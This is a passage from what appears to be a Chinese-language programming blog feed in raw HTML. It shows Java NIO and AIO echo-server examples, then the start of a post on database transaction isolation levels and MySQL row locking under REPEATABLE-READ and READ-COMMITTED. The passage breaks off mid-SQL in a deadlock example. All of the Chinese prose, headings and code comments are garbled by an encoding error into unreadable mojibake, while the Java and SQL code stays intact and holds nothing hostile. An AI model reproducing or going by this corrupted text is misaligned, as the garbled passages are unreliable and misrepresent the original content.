class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOEchoServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String host;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">shutdown</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NIOEchoServer</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shutdown</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;shutdown&quot;</span>);</span><br><span class="line">        shutdown = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">            <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();) &#123;</span><br><span class="line">            server.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(host, port));</span><br><span class="line">            server.configureBlocking(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ„Ÿå…´è¶£çš„äº‹ä»¶ï¼Œé»˜è®¤å¸¸é‡æœ‰4ä¸ªï¼ˆè¿æ¥ã€æ¥å—ã€è¯»ã€å†™ï¼‰ï¼Œ</span></span><br><span class="line">            <span class="comment">// å®šä¹‰åœ¨SelectionKeyç±»ä¸­ï¼Œä½†å¹¶ä¸æ˜¯æ‰€æœ‰Channeléƒ½ä¸€å®šæ”¯æŒï¼Œå¯ä»¥ç”¨validOps()åˆ¤æ–­ã€‚</span></span><br><span class="line">            <span class="comment">// ServerSocketChannel é»˜è®¤åªæ”¯æŒ &#123;@link SelectionKey#OP_ACCEPT&#125; äº‹ä»¶</span></span><br><span class="line">            server.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¸»å¾ªç¯ ä¸»å¾ªç¯é˜»å¡ä¼šå½±å“åé¢æ‰€æœ‰äº‹ä»¶</span></span><br><span class="line">            <span class="keyword">while</span> (!shutdown) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().isInterrupted());</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> == selector.select(<span class="number">2000</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// try...catch</span></span><br><span class="line">                Iterator&lt;SelectionKey&gt; keys = selector.selectedKeys().iterator();</span><br><span class="line">                <span class="keyword">while</span> (keys.hasNext()) &#123;</span><br><span class="line">                    <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keys.next();</span><br><span class="line">                    keys.remove();</span><br><span class="line">                    <span class="keyword">if</span> (!key.isValid()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// å®¢æˆ·ç«¯å‘èµ·è¿æ¥</span></span><br><span class="line">                    <span class="keyword">if</span> (key.isValid() &amp;&amp; key.isConnectable()) &#123;</span><br><span class="line">                        <span class="comment">//System.out.println(&quot;connect&quot;);</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// æœåŠ¡å™¨æ¥æ”¶è¿æ¥</span></span><br><span class="line">                    <span class="keyword">if</span> (key.isValid() &amp;&amp; key.isAcceptable()) &#123;</span><br><span class="line">                        <span class="comment">//System.out.println(&quot;accept&quot;);</span></span><br><span class="line">                        <span class="type">ServerSocketChannel</span> <span class="variable">serverChannel</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                        <span class="type">SocketChannel</span> <span class="variable">socket</span> <span class="operator">=</span> serverChannel.accept();</span><br><span class="line">                        socket.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                        <span class="comment">// å…±ç”¨åŒä¸€ä¸ªselector</span></span><br><span class="line">                        socket.register(selector, SelectionKey.OP_CONNECT | SelectionKey.OP_READ | SelectionKey.OP_WRITE);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (key.isValid() &amp;&amp; key.isReadable()) &#123;</span><br><span class="line">                        <span class="comment">//System.out.println(&quot;read&quot;);</span></span><br><span class="line">                        <span class="type">SocketChannel</span> <span class="variable">socket</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line"></span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">1024</span>);</span><br><span class="line">                        <span class="comment">// 0 or -1</span></span><br><span class="line">                        <span class="keyword">while</span> (socket.read(buffer) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            buffer.flip();</span><br><span class="line">                            <span class="keyword">if</span> (key.isWritable()) socket.write(buffer);</span><br><span class="line">                            buffer.clear();</span><br><span class="line">                        &#125;</span><br><span class="line">                        socket.close();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (key.isValid() &amp;&amp; key.isWritable()) &#123;</span><br><span class="line">                        <span class="comment">//System.out.println(&quot;write&quot;);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NIOEchoServer</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>AIO</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIO2EchoServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String host;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NIO2EchoServer</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">AsynchronousChannelGroup</span> <span class="variable">group</span> <span class="operator">=</span> AsynchronousChannelGroup.withThreadPool(Executors.newCachedThreadPool());</span><br><span class="line">            <span class="type">AsynchronousServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> AsynchronousServerSocketChannel.open(group).bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(host, <span class="number">8080</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¤ç”¨ServerAcceptCompletionHandlerï¼Œé¿å…åˆ›å»ºè¿‡å¤šå¯¹è±¡ã€‚</span></span><br><span class="line">            <span class="type">ServerAcceptCompletionHandler</span> <span class="variable">serverHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerAcceptCompletionHandler</span>();</span><br><span class="line">            server.accept(server, serverHandler);</span><br><span class="line">            group.awaitTermination(Long.MAX_VALUE, TimeUnit.SECONDS);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClientReadCompletionHandler</span> <span class="keyword">implements</span> <span class="title class_">CompletionHandler</span>&lt;Integer, AsynchronousSocketChannel&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ByteBuffer buffer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ClientReadCompletionHandler</span><span class="params">(<span class="type">int</span> bufferCapacity)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.buffer = ByteBuffer.allocateDirect(bufferCapacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ByteBuffer <span class="title function_">getBuffer</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> buffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer read, <span class="keyword">final</span> AsynchronousSocketChannel socket)</span> &#123;</span><br><span class="line">            buffer.flip();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// é”™è¯¯ç¤ºä¾‹ï¼š</span></span><br><span class="line">            <span class="comment">// write æ˜¯éé˜»å¡çš„ï¼Œæˆ‘ä»¬ä¸èƒ½æƒ³å½“ç„¶è®¤ä¸ºåé¢çš„buffer.clearåäºwriteæ‰§è¡Œã€‚</span></span><br><span class="line">            <span class="comment">// å¦‚æœå…ˆäºwriteæ‰§è¡Œï¼Œé‚£ä¹ˆwriteæ—¶å°†æ— æ•°æ®å¯å†™ã€‚</span></span><br><span class="line">            <span class="comment">// socket.write(buffer);</span></span><br><span class="line">            <span class="comment">// buffer.clear();</span></span><br><span class="line">            <span class="comment">// socket.read(buffer, socket, this);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ClientWriteCompletionHandler</span></span><br><span class="line">            socket.write(buffer, socket, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, AsynchronousSocketChannel&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer write, AsynchronousSocketChannel socket)</span> &#123;</span><br><span class="line">                    buffer.clear();</span><br><span class="line">                    socket.read(buffer, socket, ClientReadCompletionHandler.<span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, AsynchronousSocketChannel socket)</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, AsynchronousSocketChannel attachment)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ServerAcceptCompletionHandler</span> <span class="keyword">implements</span> <span class="title class_">CompletionHandler</span>&lt;AsynchronousSocketChannel, AsynchronousServerSocketChannel&gt; &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(AsynchronousSocketChannel socket, AsynchronousServerSocketChannel server)</span> &#123;</span><br><span class="line">            <span class="comment">// å¼€å§‹ç›‘å¬æ–°çš„è¯·æ±‚ï¼Œå›è°ƒå¤„ç†æœ‰ServerCompletionHandlerå¤„ç†</span></span><br><span class="line">            server.accept(server, <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¼€å§‹è¯»æ•°æ®ï¼Œè¯»åˆ°çš„æ•°æ®æœ‰ClientCompletionHandlerå¤„ç†</span></span><br><span class="line">            <span class="type">ClientReadCompletionHandler</span> <span class="variable">clientHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClientReadCompletionHandler</span>(<span class="number">3</span>);</span><br><span class="line">            socket.read(clientHandler.getBuffer(), socket, clientHandler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, AsynchronousServerSocketChannel server)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NIO2EchoServer</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Netty </p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    </span><br></pre></td></tr></table></figure></li></ul><p>Minaã€Nettyã€Grizzly</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>äº‹ç‰©éš”ç¦»çº§åˆ«</title>
      <link href="/post/transaction-isolation.html"/>
      <url>/post/transaction-isolation.html</url>
      
        <content type="html"><![CDATA[<h2 id="äº‹ç‰©éš”ç¦»çº§åˆ«"><a href="#äº‹ç‰©éš”ç¦»çº§åˆ«" class="headerlink" title="äº‹ç‰©éš”ç¦»çº§åˆ«"></a>äº‹ç‰©éš”ç¦»çº§åˆ«</h2><p>äº‹ç‰©çš„éš”ç¦»çº§åˆ«æ˜¯æ•°æ®åº“å¤„ç†çš„åŸºç¡€ä¹‹ä¸€ã€‚éš”ç¦»çº§åˆ«å°±æ˜¯<code>ACID</code>ç¼©å†™ä¸­çš„<code>I</code>ã€‚éš”ç¦»çº§åˆ«çš„å¾®è°ƒåœ¨æ€§èƒ½å’Œå¯é æ€§ä»¥åŠåœ¨å¤šä¸ªäº‹ç‰©åŒæ—¶ä¿®æ”¹æˆ–æŸ¥è¯¢æ—¶ç»“æœä¸€è‡´æ€§å’Œé‡å¤æ€§æ–¹é¢è·å¾—ä¸€ä¸ªå¹³è¡¡ã€‚</p><table><thead><tr><th>éš”ç¦»çº§åˆ«</th><th align="center">è„è¯»ï¼ˆDirty Readï¼‰</th><th align="center">ä¸å¯é‡å¤è¯»ï¼ˆNonRepeatable Readï¼‰</th><th align="center">å¹»è¯»ï¼ˆPhantom Readï¼‰</th></tr></thead><tbody><tr><td>READ-UNCOMMITTED</td><td align="center">å¯èƒ½</td><td align="center">å¯èƒ½</td><td align="center">å¯èƒ½</td></tr><tr><td>READ-COMMITTED</td><td align="center">ä¸å¯èƒ½</td><td align="center">å¯èƒ½</td><td align="center">å¯èƒ½</td></tr><tr><td>REPEATABLE-READ</td><td align="center">ä¸å¯èƒ½</td><td align="center">ä¸å¯èƒ½</td><td align="center">å¯èƒ½</td></tr><tr><td>SERIALIZABLE</td><td align="center">ä¸å¯èƒ½</td><td align="center">ä¸å¯èƒ½</td><td align="center">ä¸å¯èƒ½</td></tr></tbody></table><h3 id="æ•°æ®åº“äº‹åŠ¡ç‰¹æ€§ï¼ˆACIDï¼‰"><a href="#æ•°æ®åº“äº‹åŠ¡ç‰¹æ€§ï¼ˆACIDï¼‰" class="headerlink" title="æ•°æ®åº“äº‹åŠ¡ç‰¹æ€§ï¼ˆACIDï¼‰"></a>æ•°æ®åº“äº‹åŠ¡ç‰¹æ€§ï¼ˆACIDï¼‰</h3><ul><li><p>åŸå­æ€§ï¼ˆAtomicityï¼‰</p><p>  äº‹åŠ¡ä½œä¸ºä¸€ä¸ªæ•´ä½“è¢«æ‰§è¡Œï¼ŒåŒ…å«åœ¨å…¶ä¸­çš„å¯¹æ•°æ®åº“çš„æ“ä½œè¦ä¹ˆå…¨éƒ¨è¢«æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œã€‚</p></li><li><p>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰</p><p>  äº‹åŠ¡åº”ç¡®ä¿æ•°æ®åº“çš„çŠ¶æ€ä»ä¸€ä¸ªä¸€è‡´çŠ¶æ€è½¬å˜ä¸ºå¦ä¸€ä¸ªä¸€è‡´çŠ¶æ€ã€‚ä¸€è‡´çŠ¶æ€çš„å«ä¹‰æ˜¯æ•°æ®åº“ä¸­çš„æ•°æ®åº”æ»¡è¶³å®Œæ•´æ€§çº¦æŸã€‚</p></li><li><p>éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼š</p><p>  å¤šä¸ªäº‹åŠ¡å¹¶å‘æ‰§è¡Œæ—¶ï¼Œä¸€ä¸ªäº‹åŠ¡çš„æ‰§è¡Œä¸åº”å½±å“å…¶ä»–äº‹åŠ¡çš„æ‰§è¡Œã€‚</p></li><li><p>æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼š</p><p>  å·²è¢«æäº¤çš„äº‹åŠ¡å¯¹æ•°æ®åº“çš„ä¿®æ”¹åº”è¯¥æ°¸ä¹…ä¿å­˜åœ¨æ•°æ®åº“ä¸­ã€‚</p></li></ul><h3 id="MySQL-ä¸­çš„äº‹ç‰©éš”ç¦»çº§åˆ«"><a href="#MySQL-ä¸­çš„äº‹ç‰©éš”ç¦»çº§åˆ«" class="headerlink" title="MySQL ä¸­çš„äº‹ç‰©éš”ç¦»çº§åˆ«"></a>MySQL ä¸­çš„äº‹ç‰©éš”ç¦»çº§åˆ«</h3><p>MySQLä¸­é»˜è®¤çš„äº‹ç‰©éš”ç¦»ç•Œåˆ«æ˜¯<code>REPEATABLE-READ</code>ï¼Œå››ç§éš”ç¦»ç•Œä¸­æˆ‘ä»¬å¸¸ç”¨çš„è¿˜æœ‰<code>READ-COMMITTED</code>ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> t <span class="keyword">where</span> t.id <span class="operator">=</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>ç´¢å¼•æƒ…å†µ</th><th>REPEATABLE-READ</th><th>READ-COMMITTED</th></tr></thead><tbody><tr><td>IDä¸»é”®</td><td>åŒ¹é…è®°å½•Xé”</td><td>åŒ¹é…è®°å½•Xé”</td></tr><tr><td>IDå”¯ä¸€ç´¢å¼•</td><td>ç´¢å¼•å¯¹åº”çš„è®°å½•åŠ Xé”ï¼Œèšç°‡ç´¢å¼•ä¸Šå¯¹åº”çš„è®°å½•åŠ Xé”</td><td>ç´¢å¼•å¯¹åº”çš„è®°å½•åŠ Xé”ï¼Œèšç°‡ç´¢å¼•ä¸Šå¯¹åº”çš„è®°å½•åŠ Xé”</td></tr><tr><td>IDéå”¯ä¸€ç´¢å¼•</td><td>ç´¢å¼•å¯¹åº”çš„è®°å½•åŠ Xé”ï¼Œèšç°‡ç´¢å¼•å¯¹åº”çš„è®°å½•åŠ Xé”ï¼Œç´¢å¼•é—´éš™åŠ é—´éš™é”ï¼ˆåŒ…æ‹¬ä¸¤ç«¯ï¼‰</td><td>ç´¢å¼•å¯¹åº”çš„è®°å½•éƒ½åŠ Xé”ï¼Œèšç°‡ç´¢å¼•å¯¹åº”çš„è®°å½•éƒ½åŠ Xé”</td></tr><tr><td>æ— ç´¢å¼•</td><td>æ‰€æœ‰è®°å½•åŠ Xé”ï¼Œèšç°‡ç´¢å¼•æ‰€æœ‰é—´éš™åŠ é—´éš™é”</td><td>èšç°‡ç´¢å¼•ä¸Šæ‰€æœ‰è®°å½•åŠ Xé”ï¼ˆMySQL Serverå±‚é¢ä¼šè¿›è¡Œè¿‡æ»¤ï¼Œæå‰é‡Šæ”¾æ‰ä¸ç¬¦åˆæ¡ä»¶çš„è®°å½•Xé”ï¼‰</td></tr></tbody></table><p>ä¸‹é¢çš„ä¾‹å­æˆ‘ä»¬å°†è®²ä¸€ä¸‹ä¸¤è€…çš„åŒºåˆ«ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> t (a <span class="type">INT</span> <span class="keyword">NOT NULL</span>, b <span class="type">INT</span>) ENGINE <span class="operator">=</span> InnoDB;</span><br><span class="line"><span class="keyword">INSERT INTO</span> t <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="number">2</span>),(<span class="number">2</span>,<span class="number">3</span>),(<span class="number">3</span>,<span class="number">2</span>),(<span class="number">4</span>,<span class="number">3</span>),(<span class="number">5</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰§è¡Œä¸€æ¡æ›´æ–°è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Session A</span><br><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"><span class="keyword">UPDATE</span> t <span class="keyword">SET</span> b <span class="operator">=</span> <span class="number">5</span> <span class="keyword">WHERE</span> b <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€æ‰§è¡Œç¬¬äºŒæ¡æ›´æ–°è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Session B</span><br><span class="line"><span class="keyword">UPDATE</span> t <span class="keyword">SET</span> b <span class="operator">=</span> <span class="number">4</span> <span class="keyword">WHERE</span> b <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>å½“éš”ç¦»çº§åˆ«æ˜¯<code>REPEATABLE-READ</code>æ—¶ï¼Œç¬¬ä¸€æ¡è¯­å¥ä¼šé¦–å…ˆè·å–æ‰€æœ‰è¡Œçš„<code>x-lock</code>ï¼Œå¹¶ä¸€ç›´æŒæœ‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x-lock(1,2); retain x-lock</span><br><span class="line">x-lock(2,3); update(2,3) to (2,5); retain x-lock</span><br><span class="line">x-lock(3,2); retain x-lock</span><br><span class="line">x-lock(4,3); update(4,3) to (4,5); retain x-lock</span><br><span class="line">x-lock(5,2); retain x-lock</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç¬¬äºŒæ¡è¯­å¥å›å»å°è¯•è·å¾—é”ï¼Œç›´åˆ°ç¬¬ä¸€æ¡è¯­å¥æäº¤é‡Šæ”¾é”ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-lock(1,2); block and wait for first UPDATE to commit or roll back</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿™ä¸ªéš”ç¦»çº§åˆ«æ˜¯<code>READ-COMMITTED</code>ï¼Œæƒ…å†µä¼šæœ‰æ‰€ä¸åŒã€‚é¦–å…ˆç¬¬ä¸€æ¡è¯­å¥åŒæ ·ä¼šè·å–æ‰€æœ‰è¡Œçš„<code>x-lock</code>ï¼Œç„¶åå®ƒä¼šå»æ£€æŸ¥<code>where</code>æ¡ä»¶ï¼Œå¦‚æœä¸åŒ¹é…ä¼šç«‹å³é‡Šæ”¾æ‰è¿™æ¡è®°å½•çš„<code>x-lock</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x-lock(1,2); unlock(1,2) releases those for rows that it does not modify</span><br><span class="line">x-lock(2,3); update(2,3) to (2,5); retain x-lock</span><br><span class="line">x-lock(3,2); unlock(3,2)</span><br><span class="line">x-lock(4,3); update(4,3) to (4,5); retain x-lock</span><br><span class="line">x-lock(5,2); unlock(5,2)</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ¡æŸ¥è¯¢è¯­å¥ä¼šå…ˆè¯»å–æ¯æ¡è®°å½•çš„ä¸€ä¸ªæœ€æ–°çš„å¿«ç…§ï¼Œç„¶åå»æ£€æŸ¥<code>where</code>æ¡ä»¶æ˜¯å¦åŒ¹é…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x-lock(1,2); update(1,2) to (1,4); retain x-lock</span><br><span class="line">x-lock(2,3); unlock(2,3)</span><br><span class="line">x-lock(3,2); update(3,2) to (3,4); retain x-lock</span><br><span class="line">x-lock(4,3); unlock(4,3)</span><br><span class="line">x-lock(5,2); update(5,2) to (5,4); retain x-lock</span><br></pre></td></tr></table></figure><h3 id="æ­»é”ç¤ºä¾‹"><a href="#æ­»é”ç¤ºä¾‹" class="headerlink" title="æ­»é”ç¤ºä¾‹"></a>æ­»é”ç¤ºä¾‹</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create table</span> question (</span><br><span class="line">id <span class="type">int</span> <span class="keyword">not null</span> auto_increment,</span><br><span class="line">source <span class="type">varchar</span>(<span class="number">20</span>), </span><br><span class="line">sid <span class="type">int</span>,</span><br><span class="line">create_at <span class="type">bigint</span>,</span><br><span class="line"><span class="keyword">primary key</span> (`id`),</span><br><span class="line">KEY `idx_source_sid` (`source`,`sid`)</span><br><span class="line">)ENGINE<span class="operator">=</span>InnoDB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert into</span> question(source, sid, create_at) <span class="keyword">values</span> (<span class="string">&#x27;us&#x27;</span>, <span class="number">100</span>, unix_timestamp(now()));</span><br><span class="line"><span class="keyword">insert into</span> question(source, sid, create_at) <span class="keyword">values</span> (<span class="string">&#x27;us&#x27;</span>, <span class="number">101</span>, unix_timestamp(now()));</span><br><span class="line"><span class="keyword">insert into</span> question(source, 